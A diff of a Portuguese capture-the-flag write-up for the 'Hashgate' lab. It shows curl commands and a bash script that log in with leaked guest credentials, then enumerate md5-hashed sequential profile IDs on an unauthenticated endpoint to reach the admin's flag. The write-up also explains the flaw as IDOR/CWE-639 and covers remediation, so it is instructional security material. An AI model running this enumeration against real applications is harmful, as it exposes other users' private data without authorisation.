@@ -13,7 +13,7 @@
 
 ## TL;DR
 
-O perfil fica em `/profile/user/<md5(id)>`, onde `id` é um número sequencial — e o endpoint **nem exige login**. Logar como guest (credenciais vazadas num comentário HTML) redireciona para `/profile/user/md5(3000)`, revelando o esquema. Como o ID é um inteiro pequeno e previsível, calculo `MD5` de cada ID numa faixa e acesso os perfis. O ID do `admin` devolve a flag.
+O perfil fica em `/profile/user/<md5(id)>`, onde `id` é um número sequencial, e o endpoint **nem exige login**. Logar como guest (credenciais vazadas num comentário HTML) redireciona para `/profile/user/md5(3000)`, revelando o esquema. Como o ID é um inteiro pequeno e previsível, calculo `MD5` de cada ID numa faixa e acesso os perfis. O ID do `admin` devolve a flag.
 
 > [!IMPORTANT]
 > **Ideia-chave:** passar um identificador sequencial por uma função de hash **não** o torna secreto. Se o conjunto de entradas é pequeno e previsível, dá para pré-computar todos os hashes. É um IDOR com uma camada de ofuscação.
@@ -34,7 +34,7 @@ O perfil fica em `/profile/user/<md5(id)>`, onde `id` é um número sequencial �
 
 ## Dicas progressivas
 
-<details><summary>Dica 1</summary>Veja o fonte da página de login — tem um comentário HTML com credenciais de guest.</details>
+<details><summary>Dica 1</summary>Veja o fonte da página de login, tem um comentário HTML com credenciais de guest.</details>
 <details><summary>Dica 2</summary>Ao logar, o redirect leva a <code>/profile/user/&lt;hash&gt;</code>. Esse hash é o <code>MD5</code> do seu ID numérico (guest = 3000).</details>
 <details><summary>Dica 3</summary>Os IDs são sequenciais e há poucos funcionários, e o endpoint do perfil não checa autenticação. Faça <code>MD5</code> de cada ID vizinho e acesse <code>/profile/user/&lt;hash&gt;</code>.</details>
 
@@ -44,7 +44,7 @@ O perfil fica em `/profile/user/<md5(id)>`, onde `id` é um número sequencial �
 
 Na minha instância o alvo estava em `http://xebec.cylabacademy.net:16152`. Use o da sua.
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 export BASE_URL=http://xebec.cylabacademy.net:16152
@@ -56,7 +56,7 @@ export BASE_URL=http://xebec.cylabacademy.net:16152
 
 O fonte da página de login traz um comentário com credenciais de teste e o form envia um POST JSON para `/login`:
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 curl -s $BASE_URL/ | grep -i -A1 -B1 "Email:"
@@ -68,9 +68,9 @@ curl -s $BASE_URL/ | grep -i -A1 -B1 "Email:"
 
 ### 2. Descobrindo o esquema do perfil
 
-Logando com essa conta, o servidor responde `302` e redireciona para o meu perfil — a URL termina num hash de 32 caracteres hexadecimais:
+Logando com essa conta, o servidor responde `302` e redireciona para o meu perfil, a URL termina num hash de 32 caracteres hexadecimais:
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 curl -s -i -X POST $BASE_URL/login -H 'Content-Type: application/json' --data '{"email":"guest@cylabacademy.org","password":"guest"}' | grep -i location
@@ -80,9 +80,9 @@ curl -s -i -X POST $BASE_URL/login -H 'Content-Type: application/json' --data '{
 Location: /profile/user/e93028bdc1aacdfb3687181f2031765d
 ```
 
-Esse hash é `md5("3000")` — ou seja, o meu ID de guest é `3000` e a URL do perfil é `/profile/user/<md5(id)>`. E acessando esse endpoint direto (sem cookie nenhum), ele responde: o controle de perfil **não exige autenticação**.
+Esse hash é `md5("3000")`, ou seja, o meu ID de guest é `3000` e a URL do perfil é `/profile/user/<md5(id)>`. E acessando esse endpoint direto (sem cookie nenhum), ele responde: o controle de perfil **não exige autenticação**.
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 curl -s "$BASE_URL/profile/user/$(echo -n 3000 | md5sum | awk '{print $1}')"
@@ -93,7 +93,7 @@ Access level: Guest (ID: 3000). Insufficient privileges to view classified data.
 ```
 
 > [!TIP]
-> **Conceito: IDOR (Insecure Direct Object Reference).** O servidor expõe um objeto (o perfil) diretamente por um identificador que o cliente controla, sem checar se aquele usuário pode vê-lo. Trocar o identificador por outro dá acesso ao objeto alheio. Passar o ID por `MD5` só troca "adivinhar o número" por "adivinhar o hash do número" — e como o número é pequeno e sequencial, o hash é igualmente previsível. Referência: [OWASP — IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References).
+> **Conceito: IDOR (Insecure Direct Object Reference).** O servidor expõe um objeto (o perfil) diretamente por um identificador que o cliente controla, sem checar se aquele usuário pode vê-lo. Trocar o identificador por outro dá acesso ao objeto alheio. Passar o ID por `MD5` só troca "adivinhar o número" por "adivinhar o hash do número", e como o número é pequeno e sequencial, o hash é igualmente previsível. Referência: [OWASP: IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References).
 
 ### 3. Enumerando os perfis até o admin
 
@@ -103,9 +103,14 @@ Com o ID do guest em 3000 e a dica de ~20 funcionários, basta calcular `MD5` de
 
 ```bash
 #!/bin/bash
+# Hashgate: IDOR via MD5(id) sequencial. O endpoint /profile/user/<md5(id)>
+# não exige autenticação; o guest tem ID 3000. Varro IDs em volta de 3000,
+# calculo MD5 de cada um e procuro o perfil do admin (que traz a flag).
+#
+# Uso: BASE_URL=http://host:porta bash script1.sh
+
 BASE_URL="${BASE_URL:-http://xebec.cylabacademy.net:16152}"
 
-# IDs sequenciais; guest = 3000. Varro uma faixa em volta.
 START_ID=2980
 END_ID=3100
 
@@ -123,9 +128,11 @@ for id in $(seq $START_ID $END_ID); do
         fi
     fi
 done
+
+echo "[!] Fim. Se não apareceu flag, amplie a faixa START_ID/END_ID."
 ```
 
-***INSERIR no terminal — Kali (atacante)
+***INSERIR no terminal: Kali (atacante)
 
 ```bash
 bash scripts/script1.sh
@@ -151,7 +158,7 @@ flowchart LR
 
 ## Por que funciona
 
-O controle de acesso ao perfil do admin depende apenas de o atacante não conhecer o identificador — é segurança por obscuridade, e o endpoint sequer checa autenticação. O `MD5` do ID não é segredo: o ID é um inteiro pequeno e sequencial, então o atacante pré-computa todos os hashes possíveis em segundos. Falta a verificação de autorização ("o usuário logado tem permissão de ver este perfil?"). Classe: CWE-639 (*Authorization Bypass Through User-Controlled Key*) / IDOR.
+O controle de acesso ao perfil do admin depende apenas de o atacante não conhecer o identificador, é segurança por obscuridade, e o endpoint sequer checa autenticação. O `MD5` do ID não é segredo: o ID é um inteiro pequeno e sequencial, então o atacante pré-computa todos os hashes possíveis em segundos. Falta a verificação de autorização ("o usuário logado tem permissão de ver este perfil?"). Classe: CWE-639 (*Authorization Bypass Through User-Controlled Key*) / IDOR.
 
 ## Remediação
 
@@ -166,7 +173,7 @@ O controle de acesso ao perfil do admin depende apenas de o atacante não conhec
 
 ## Referências
 
-- [OWASP — Testing for IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
+- [OWASP: Testing for IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
 - [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
 
 ## Flag
